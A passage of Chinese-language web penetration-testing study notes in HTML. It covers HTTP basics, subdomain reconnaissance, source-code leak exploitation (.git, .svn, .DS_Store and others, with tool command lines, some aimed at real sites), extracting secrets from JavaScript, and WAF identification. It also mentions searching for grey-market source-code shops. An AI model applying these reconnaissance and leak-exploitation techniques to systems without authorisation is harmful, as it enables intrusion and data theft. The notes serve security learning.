style=\"text-align:center\"><strong>500</strong></td>\n<td style=\"text-align:center\">5xx (服务器错误)</td>\n<td style=\"text-align:center\">Internal Server Error</td>\n<td style=\"text-align:center\">服务器内部错误（代码异常、配置问题）</td>\n<td style=\"text-align:center\">-</td>\n<td style=\"text-align:center\">否</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>502</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Bad Gateway</td>\n<td style=\"text-align:center\">网关服务器收到上游无效响应（如 Nginx 后端服务崩溃）</td>\n<td style=\"text-align:center\">-</td>\n<td style=\"text-align:center\">否</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>503</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Service Unavailable</td>\n<td style=\"text-align:center\">服务暂时不可用（过载或维护）</td>\n<td style=\"text-align:center\"><code>Retry-After: 3600</code></td>\n<td style=\"text-align:center\">否</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>504</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Gateway Timeout</td>\n<td style=\"text-align:center\">网关等待上游响应超时（如数据库查询超时）</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\"></td>\n</tr>\n</tbody>\n</table>\n<p><span style=\"font-weight:bold; font-size:1.2em;\">关键特性说明</span></p>\n<p><span style=\"font-weight:bold; font-size:1.1em;\">1.幂等性</span></p>\n<ul>\n<li><strong>幂等操作</strong>（如 <code>GET</code>/<code>PUT</code>/<code>DELETE</code>）：多次重复请求效果相同，客户端可安全重试</li>\n<li><strong>非幂等操作</strong>（如 <code>POST</code>）：重复请求可能导致资源重复创建，需谨慎处理</li>\n</ul>\n<p><span style=\"font-weight:bold; font-size:1.1em;\">2.重定向类型对比</span></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>特性</strong></th>\n<th style=\"text-align:center\">301/308</th>\n<th style=\"text-align:center\">302/307</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><strong>持久性</strong></td>\n<td style=\"text-align:center\">永久</td>\n<td style=\"text-align:center\">临时</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>SEO 影响</strong></td>\n<td style=\"text-align:center\">转移权重</td>\n<td style=\"text-align:center\">保留原权重</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>方法保持</strong></td>\n<td style=\"text-align:center\">301 可改方法 308 禁止改方法</td>\n<td style=\"text-align:center\">302 可改方法 307 禁止改方法</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"span-style-font-size-1-1em-3-响应头-（Response-Headers）-span\"><span style=\"font-size:1.1em;\">3.响应头**（Response Headers）**</span></h5>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>关键响应头</strong></th>\n<th style=\"text-align:center\"><strong>作用</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><code>Content-Type: text/html</code></td>\n<td style=\"text-align:center\">响应体类型（如 <code>application/json</code>）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>Set-Cookie: sessionId=...</code></td>\n<td style=\"text-align:center\">向客户端写入 Cookie（属性：<code>HttpOnly</code>、<code>Secure</code>、<code>SameSite</code>）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>Cache-Control: max-age=3600</code></td>\n<td style=\"text-align:center\">缓存控制策略（如 <code>public</code>、<code>no-cache</code>）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>Location: /new-path</code></td>\n<td style=\"text-align:center\">重定向目标地址（配合 <code>3xx</code> 状态码）</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"span-style-font-size-1-1em-4-响应体-（Response-Body）-span\"><span style=\"font-size:1.1em;\">4.响应体**（Response Body）**</span></h5>\n<ul>\n<li><strong>内容形式</strong>：HTML、JSON、图片等服务器返回的实际数据</li>\n<li><strong>长度标识</strong>：<code>Content-Length</code> 或分块传输编码</li>\n</ul>\n<h4 id=\"四、HTTP-方法全集\">四、HTTP 方法全集</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>方法</strong></th>\n<th style=\"text-align:center\"><strong>语义</strong></th>\n<th style=\"text-align:center\"><strong>幂等性</strong></th>\n<th style=\"text-align:center\"><strong>安全性</strong></th>\n<th style=\"text-align:center\"><strong>应用场景</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><code>GET</code></td>\n<td style=\"text-align:center\">获取资源</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">页面加载、API 数据查询</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>POST</code></td>\n<td style=\"text-align:center\">创建资源</td>\n<td style=\"text-align:center\">否</td>\n<td style=\"text-align:center\">否</td>\n<td style=\"text-align:center\">表单提交、文件上传</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>PUT</code></td>\n<td style=\"text-align:center\">替换整个资源</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">否</td>\n<td style=\"text-align:center\">全量更新用户信息</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>DELETE</code></td>\n<td style=\"text-align:center\">删除资源</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">否</td>\n<td style=\"text-align:center\">删除文章</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>PATCH</code></td>\n<td style=\"text-align:center\">部分更新资源</td>\n<td style=\"text-align:center\">否</td>\n<td style=\"text-align:center\">否</td>\n<td style=\"text-align:center\">修改用户昵称</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>HEAD</code></td>\n<td style=\"text-align:center\">获取资源元数据</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">检查链接有效性</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>OPTIONS</code></td>\n<td style=\"text-align:center\">查询服务器支持的方法</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">CORS 预检请求</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>TRACE</code></td>\n<td style=\"text-align:center\">诊断连接路径</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">网络调试</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"五、HTTPS-对数据包的影响\">五、HTTPS 对数据包的影响</h4>\n<ul>\n<li><strong>加密层</strong>：在 HTTP 与 TCP 间插入 <strong>TLS/SSL 协议</strong>（端口 443），对原始 HTTP 报文加密传输</li>\n<li><strong>报文变化</strong>：\n<ul>\n<li>明文 → 二进制加密数据（握手阶段协商对称密钥）</li>\n<li>保留 HTTP 语义，但无法直接读取内容（需解密）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"六、协议演进\">六、协议演进</h4>\n<h5 id=\"span-style-font-size-1-1em-1-HTTP-1-1-span\"><span style=\"font-size:1.1em;\">1.HTTP/1.1</span></h5>\n<ul>\n<li>持久连接（<code>Connection: keep-alive</code>）</li>\n<li>分块传输（<code>Transfer-Encoding: chunked</code>）</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-2-HTTP-2-span\"><span style=\"font-size:1.1em;\">2.HTTP/2</span></h5>\n<ul>\n<li><strong>二进制分帧</strong>：将报文拆分为帧（Frame），多路复用提升效率</li>\n<li><strong>头部压缩</strong>：HPACK 算法减少冗余</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-3-HTTP-3-span\"><span style=\"font-size:1.1em;\">3.HTTP/3</span></h5>\n<ul>\n<li>基于 QUIC 协议（UDP），解决队头阻塞</li>\n</ul>\n<h4 id=\"七、补充\">七、补充</h4>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250624002607785.png\" alt=\"image-20250624002607785\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250624002625184.png\" alt=\"image-20250624002625184\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250624002643130.png\" alt=\"image-20250624002643130\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250624002658187.png\" alt=\"image-20250624002658187\"></p>\n<h3 id=\"八、思维导图\">八、思维导图</h3>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/AgAACJ36SmWRUzD4yvJKX6iQ3KyA9HOe.png\" alt=\"\"></p>\n<h2 id=\"信息打点\">信息打点</h2>\n<h3 id=\"一、Web-应用-2\">一、Web 应用</h3>\n<h4 id=\"1-Web-单域名\"><a href=\"http://1.Web\">1.Web</a> 单域名</h4>\n<p><strong>查询方法：</strong></p>\n<ul>\n<li>备案信息</li>\n<li>企业产权</li>\n<li>注册域名</li>\n<li>反查解析</li>\n</ul>\n<h4 id=\"2-Web-子域名\"><a href=\"http://2.Web\">2.Web</a> 子域名</h4>\n<h5 id=\"（1）DNS-数据查询\">（1）DNS 数据查询</h5>\n<ul>\n<li>\n<p><strong>原理</strong>：通过解析域名的权威 DNS 记录（NS、MX、TXT、CNAME 等），挖掘隐含的子域名信息。DNS 协议响应中可能暴露管理后台、邮件服务器等关键子域。</p>\n</li>\n<li>\n<p><strong>记录类型分析</strong>：</p>\n<ul>\n<li><code>NS记录</code>：权威 DNS 服务器（如 <code>ns1.example.com</code>）</li>\n<li><code>MX记录</code>：邮件服务器子域（如 <code>mail.example.com</code>）</li>\n<li><code>TXT记录</code>：可能包含 SPF 策略或隐藏子域线索</li>\n</ul>\n</li>\n<li>\n<p><span style=\"font-weight:bold;\">优缺点</span>：</p>\n<ul>\n<li>✅ 直接获取权威数据，准确性高</li>\n<li>❌ 依赖 DNS 配置完整性，隐私保护域名信息可能缺失</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"（2）证书查询\">（2）证书查询</h5>\n<ul>\n<li><span style=\"font-weight:bold;\">原理</span>：基于证书透明度（Certificate Transparency, CT）政策，CA 机构公开所有 SSL/TLS 证书信息，证书中常包含主域名关联的子域名</li>\n<li><span style=\"font-weight:bold;\">技术流程</span>：\n<ul>\n<li>证书日志聚合平台（如 <a href=\"http://crt.sh\">crt.sh</a>）抓取公开 CT 日志</li>\n<li>解析证书的 <code>Subject Alternative Name (SAN)</code> 字段，提取所有绑定域名</li>\n<li>关联同一组织证书，发现业务子域（如 <code>api.example.com</code>, <code>dev.example.com</code>）</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">适用场景</span>：\n<ul>\n<li>发现 HTTPS 服务子域</li>\n<li>追踪证书更新历史中的废弃子域（如测试环境）</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"（3）网络空间查询\">（3）网络空间查询</h5>\n<ul>\n<li><span style=\"font-weight:bold;\">原理</span>：通过扫描全网 IP 和开放端口，建立“IP-域名-服务”映射关系库，反向关联子域名</li>\n<li><span style=\"font-weight:bold;\">数据关联技术</span>：\n<ul>\n<li><strong>IP 反查</strong>：同一 IP 可能绑定多个子域名（如 CDN 节点）</li>\n<li><strong>服务指纹识别</strong>：根据 HTTP 响应头、页面特征匹配归属组织</li>\n<li><strong>ASN 归属分析</strong>：通过 IP 段归属企业，推测未公开子域</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">优势</span>：覆盖范围广，可发现非标准 DNS 配置的资产</li>\n</ul>\n<h5 id=\"（4）威胁情报查询\">（4）威胁情报查询</h5>\n<ul>\n<li><strong>原理</strong>：整合公开漏洞库、黑客论坛、恶意软件流量等数据源，提取攻击活动中暴露的子域名</li>\n<li><strong>数据来源</strong>：\n<ul>\n<li><strong>VirusTotal</strong>：恶意文件通信域名、DNS 历史记录</li>\n<li><strong>AlienVault OTX</strong>：众包威胁数据中的资产线索</li>\n<li><strong>PassiveDNS</strong>：历史 DNS 解析存档（如 SecurityTrails）</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">应用</span>：\n<ul>\n<li>发现钓鱼仿冒子域（如 <code>login-example.com</code>）</li>\n<li>定位 C&amp;C 服务器关联域名</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"（5）枚举解析\">（5）枚举解析</h5>\n<ul>\n<li><strong>原理</strong>：通过字典轮询可能的子域名组合，向 DNS 服务器发起批量查询，筛选有效响应</li>\n</ul>\n<h5 id=\"（6）对比与实战建议\">（6）对比与实战建议</h5>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>查询方式</strong></th>\n<th style=\"text-align:center\"><strong>覆盖深度</strong></th>\n<th style=\"text-align:center\"><strong>速度</strong></th>\n<th style=\"text-align:center\"><strong>隐蔽性</strong></th>\n<th style=\"text-align:center\"><strong>典型场景</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">DNS 数据</td>\n<td style=\"text-align:center\">★★☆</td>\n<td style=\"text-align:center\">★★★</td>\n<td style=\"text-align:center\">★★☆</td>\n<td style=\"text-align:center\">快速获取权威记录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">证书查询</td>\n<td style=\"text-align:center\">★★★</td>\n<td style=\"text-align:center\">★★★★</td>\n<td style=\"text-align:center\">★★★★</td>\n<td style=\"text-align:center\">HTTPS 资产发现</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">网络空间测绘</td>\n<td style=\"text-align:center\">★★★★</td>\n<td style=\"text-align:center\">★★☆</td>\n<td style=\"text-align:center\">★★★★</td>\n<td style=\"text-align:center\">全网资产关联分析</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">威胁情报</td>\n<td style=\"text-align:center\">★★★☆</td>\n<td style=\"text-align:center\">★★★☆</td>\n<td style=\"text-align:center\">★★★★★</td>\n<td style=\"text-align:center\">对抗攻击溯源</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">枚举解析</td>\n<td style=\"text-align:center\">★★★★★</td>\n<td style=\"text-align:center\">★☆</td>\n<td style=\"text-align:center\">★☆</td>\n<td style=\"text-align:center\">深度渗透测试（需授权）</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"3-源码获取\">3.源码获取</h4>\n<h5 id=\"3-1-开源\">3.1.开源</h5>\n<ul>\n<li><strong>核心逻辑</strong>：开源项目具有普遍性和明显特征，可通过指纹识别快速定位框架类型，找到 cms，进而下载源码。</li>\n<li><strong>实战技巧</strong>：\n<ul>\n<li>对识别出的 CMS，访问其 <code>/admin/login</code> 等默认路径验证一致性；</li>\n<li>通过 GitHub 搜索特征字符串（如 JS 中的版权信息）定位源码仓库。</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"3-2-闭源\">3.2.闭源</h5>\n<ul>\n<li>\n<p><strong>泄露的原因</strong>：</p>\n<ul>\n<li>1.从源码本身的特性入口</li>\n<li>2.从管理员不好的习惯入口</li>\n<li>3.从管理员不好的配置入口</li>\n<li>4.从管理员不好的意识入口</li>\n<li>5.从管理员资源信息搜集入口</li>\n</ul>\n</li>\n<li>\n<p><strong>常见的 Web 源码泄露及其利用</strong>：</p>\n</li>\n</ul>\n<h6 id=\"（1）git-源码泄露\">（1）<strong>git 源码泄露</strong></h6>\n<ul>\n<li>\n<p>Git 是一个开源的分布式版本控制系统，在执行 <code>git init</code> 初始化目录的时候，会在当前目录下自动创建一个 <code>.git</code> 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把 <code>.git</code> 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p>\n</li>\n<li>\n<p>漏洞利用工具：GitHack</p>\n</li>\n<li>\n<p>github 项目地址：<a href=\"https://github.com/lijiejie/GitHack\">https://github.com/lijiejie/GitHack</a></p>\n</li>\n<li>\n<p>用法示例：<code>GitHack.py http://www.openssl.org/.git/</code></p>\n</li>\n<li>\n<p>修复建议：删除.git 目录或者修改中间件配置进行对.git 隐藏文件夹的访问。</p>\n</li>\n</ul>\n<h6 id=\"（2）svn-源码泄露\">（2）svn 源码泄露</h6>\n<ul>\n<li>SVN 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为.svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到 WEB 服务器上，这就使.svn 隐藏文件夹被暴露于外网环境，可以利用.svn/entries 文件，获取到服务器源码。</li>\n<li>漏洞利用工具：Seay SVN 漏洞利用工具</li>\n<li>修复建议：删除 web 目录中所有.svn 隐藏文件夹，开发人员在使用 SVN 时，严格使用导出功能，禁止直接复制代码。</li>\n</ul>\n<h6 id=\"（3）hg-源码泄露\">（3）hg  源码泄露</h6>\n<ul>\n<li>Mercurial 是一种轻量级分布式版本控制系统，使用 <code>hg init</code> 的时候会生成.hg。</li>\n<li>漏洞利用工具：dvcs-ripper</li>\n<li>用法示例：<code>rip-hg.pl -v -u http://www.example.com/.hg/</code></li>\n</ul>\n<h6 id=\"（4）cvs-泄露\">（4）cvs 泄露</h6>\n<ul>\n<li>\n<p>CVS 是一个 C/S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root 以及 CVS/Entries 目录，直接就可以看到泄露的信息。</p>\n</li>\n<li>\n<p>漏洞利用工具：dvcs-ripper</p>\n</li>\n<li>\n<p>github 项目地址：<a href=\"https://github.com/kost/dvcs-ripper.git\">https://github.com/kost/dvcs-ripper.git</a></p>\n</li>\n<li>\n<p>运行示例：<code>rip-cvs.pl -v -u http://www.example.com/CVS/</code></p>\n</li>\n</ul>\n<h6 id=\"（5）Bazaar-bzr-泄露\">（5）Bazaar/bzr 泄露</h6>\n<ul>\n<li>\n<p>bzr 也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。</p>\n</li>\n<li>\n<p>运行示例：<code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></p>\n</li>\n</ul>\n<h6 id=\"（6）网站备份压缩文件\">（6）<strong>网站备份压缩文件</strong></h6>\n<ul>\n<li>管理员将网站源代码备份在 Web 目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。</li>\n<li>常见的备份文件后缀：\n<ul>\n<li>.rar</li>\n<li>.zip</li>\n<li>.tar.gz</li>\n<li>.bak</li>\n<li>.txt</li>\n<li>.old</li>\n<li>.temp</li>\n</ul>\n</li>\n<li>测试工具用扫描的就行</li>\n</ul>\n<h6 id=\"（7）WEB-INF-web-xml-泄露\">（7）WEB-INF/web.xml 泄露</h6>\n<ul>\n<li>WEB-INF 是 Java 的 WEB 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应的映射才能访问。</li>\n<li>WEB-INF 主要包含以下文件或目录：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class=\"line\">WEB-INF/database.properties : 数据库配置文件</span><br><span class=\"line\">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class=\"line\">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class=\"line\">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。</li>\n</ul>\n<h6 id=\"（8）DS-Store-文件泄露\">（8）DS-Store 文件泄露</h6>\n<ul>\n<li>.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</li>\n<li>github 项目地址：<a href=\"https://github.com/lijiejie/ds_store_exp\">https://github.com/lijiejie/ds_store_exp</a></li>\n<li>用法示例：<code>ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store</code></li>\n</ul>\n<h6 id=\"（9）SWP-文件泄露\">（9）SWP 文件泄露</h6>\n<ul>\n<li>swp 即 swap 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。</li>\n<li>漏洞利用：直接访问.swp 文件，下载回来后删掉末尾的.swp，获得源码文件。</li>\n</ul>\n<h6 id=\"（10）GitHub-源码泄露\">（10）<strong>GitHub 源码泄露</strong></h6>\n<ul>\n<li>GitHub 是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。</li>\n<li>类似的代码托管平台还有很多，人才是最大的漏洞。</li>\n<li>GitHub 深度搜索：\n<ul>\n<li><strong>语法组合</strong>：<code>in:readme 公司名</code> + <code>language:php</code> 定位内部项目；</li>\n<li><strong>特征提取</strong>：扫描 JS/CSS 中的邮箱、API 密钥，反查员工公开仓库。</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"3-3-黑灰产业源码商城\">3.3.黑灰产业源码商城</h5>\n<ul>\n<li>通过谷歌搜索博彩源码商城、约友程序批发的关键词，定位境外平台（如 CodeCanyon 擦边板块）</li>\n</ul>\n<h4 id=\"4-JS-前端架构\">4.JS 前端架构</h4>\n<h5 id=\"4-1-什么是-JS-渗透测试？\">4.1.什么是 JS 渗透测试？</h5>\n<ul>\n<li>\n<p>在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞</p>\n<p>JS 开发的 WEB 应用和 PHP，JAVA, NET 等区别在于即没有源代码，也可以通过浏览器的</p>\n<p>查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于</p>\n<p>JS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL</p>\n<p>地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。</p>\n</li>\n<li>\n<p>前提：Web 应用可以采用后端或前端语言开发</p>\n<ul>\n<li>后端语言：php java python .NET 浏览器端看不到真实的源代码</li>\n<li>前端语言：JavaScript(JS)和 JS 框架 浏览器端看到真实的源代码</li>\n</ul>\n</li>\n<li>\n<p>例子：</p>\n<ul>\n<li>zblog：核心功能采用 PHP 语言去传输接受</li>\n<li>vue.js：核心功能采用框架语法（JS）传输接受</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"4-2-JS-泄漏的攻击面\">4.2. JS 泄漏的攻击面</h5>\n<p><strong>1.敏感信息硬编码</strong></p>\n<ul>\n<li><strong>凭证泄露</strong>：API 密钥、数据库密码、云服务 AK/SK 直接写在 JS 中（如阿里云 OSS 密钥），攻击者可直接调用云服务 API 篡改数据。</li>\n<li><strong>用户隐私</strong>：姓名、手机号、身份证号未经脱敏渲染至前端（如某 FM 应用评论模块泄露用户邮箱）。</li>\n<li><strong>测试数据残留</strong>：生产环境保留测试账号 Token，导致未授权登录后台</li>\n</ul>\n<p><strong>2.接口路径暴露</strong></p>\n<ul>\n<li><strong>后台管理路径</strong>：JS 注释或配置中遗留调试接口（如 <code>/admin/console</code>、<code>/api/internal</code>），暴露攻击入口。</li>\n<li><strong>未授权 API</strong>：前端路由配置泄露无需认证的 API（如数据查询接口），可被爬虫批量利用。</li>\n</ul>\n<p><strong>3.系统架构信息</strong></p>\n<ul>\n<li><strong>技术栈标识</strong>：JS 引入文件路径（如 <code>/static/js/app.js</code>）暴露框架类型（Vue/React）</li>\n<li><strong>版本控制痕迹</strong>：<code>.map</code> 文件泄露源码映射，便于逆向分析。</li>\n</ul>\n<h5 id=\"4-3-流行的-JS-框架\">4.3.流行的 JS 框架</h5>\n<ul>\n<li>Vue NodeJS jQuery Angular 等</li>\n</ul>\n<h5 id=\"4-4-JS-开发应用的判定\">4.4. JS 开发应用的判定</h5>\n<ul>\n<li>插件 wappalyzer</li>\n<li>源程序代码简短</li>\n<li>引入多个 js 文件</li>\n<li>一般有/static/js/app.js 等顺序的 js 文件</li>\n<li>一般 cookie 中有 connect.sid</li>\n</ul>\n<h5 id=\"4-5-JS-信息提取技术方法\">4.5. JS 信息提取技术方法</h5>\n<p><strong>1.手工提取</strong></p>\n<ul>\n<li>浏览器进行抓包检查</li>\n<li>全局关键字</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src=</span><br><span class=\"line\">path=</span><br><span class=\"line\"><span class=\"attr\">method</span>:<span class=\"string\">&quot;get&quot;</span></span><br><span class=\"line\">http.<span class=\"property\">get</span> (<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">method:&quot;</span>post<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">http.post (&quot;</span></span><br><span class=\"line\">$.ajax</span><br><span class=\"line\"><span class=\"attr\">http</span>:<span class=\"comment\">//service.httppost</span></span><br><span class=\"line\"><span class=\"attr\">http</span>:<span class=\"comment\">//service.httpget</span></span><br></pre></td></tr></table></figure>\n<p><strong>2.半自动提取</strong></p>\n<ul>\n<li>Burp Suite 插件：\n<ul>\n<li>自带功能：Target-&gt; sitemap-&gt; Engagement tools-&gt; Find scripts (脚本查找敏感信息)</li>\n<li>官方插件：<code>JS Miner</code>、<code>JS Link Finder</code></li>\n<li>第三方插件：<code>HaE</code>、<code>Unexpected_information</code></li>\n<li>插件加载器：jython-standalone-2.7.2</li>\n</ul>\n</li>\n</ul>\n<p><strong>3.自动提取</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>工具类型</strong></th>\n<th style=\"text-align:center\"><strong>代表工具</strong></th>\n<th style=\"text-align:center\"><strong>功能</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><strong>URL/子域名提取</strong></td>\n<td style=\"text-align:center\">JSFinder、<strong>URLFinder</strong></td>\n<td style=\"text-align:center\">快速爬取 JS 中的接口路径和子域名</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>敏感信息扫描</strong></td>\n<td style=\"text-align:center\">HaE、<strong>FindSomething</strong>(浏览器插件)</td>\n<td style=\"text-align:center\">标记 JS 中的密钥、手机号、邮箱等敏感数据</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>WebPack 解析</strong></td>\n<td style=\"text-align:center\"><strong>Packer-Fuzzer</strong>、jjjjjjs</td>\n<td style=\"text-align:center\">解构 Webpack 打包的 JS 文件，提取隐藏接口</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>FUZZ 测试</strong></td>\n<td style=\"text-align:center\"><strong>ffuf</strong></td>\n<td style=\"text-align:center\">用 fuzz 爆破更多 JS，对提取的路径进行模糊测试，探测未授权访问</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"4-6-高危漏洞案例\">4.6.高危漏洞案例</h5>\n<p><strong>1.后台路径泄露 → 云存储沦陷</strong></p>\n<ul>\n<li>某网站 JS 文件泄露后台路径 <code>/admin/config-backup</code>，攻击者访问后获取 OSS 的 AK/SK，最终控制云存储桶删改文件。</li>\n</ul>\n<p><strong>2.身份凭证硬编码 → 管理员权限获取</strong></p>\n<ul>\n<li>前端 JS 内嵌测试账号 Token，攻击者替换登录包中的 Token 直接进入后台。</li>\n</ul>\n<p><strong>3.用户数据无脱敏 → 批量隐私泄露</strong></p>\n<ul>\n<li>某平台服务端返回用户身份证号、银行卡号至前端，通过源码查看可爬取全站用户隐私。</li>\n</ul>\n<h4 id=\"5-识别防火墙\">5.识别防火墙</h4>\n<ul>\n<li>\n<p><strong>WAF</strong>：Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。</p>\n</li>\n<li>\n<p><strong>WAF 分类</strong>：</p>\n<ul>\n<li>云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等</li>\n<li>硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品</li>\n<li>软件 WAF：宝塔，安全狗、D 盾等</li>\n<li>代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的</li>\n</ul>\n</li>\n<li>\n<p><strong>识别方法</strong>：</p>\n<ul>\n<li>看图识别：拦截页面，identywaf 项目内置</li>\n<li>识别项目：wafw00f   <a href=\"https://github.com/EnableSecurity/wafw00f\">https://github.com/EnableSecurity/wafw00f</a></li>\n</ul>\n</li>\n</ul>\n<h4 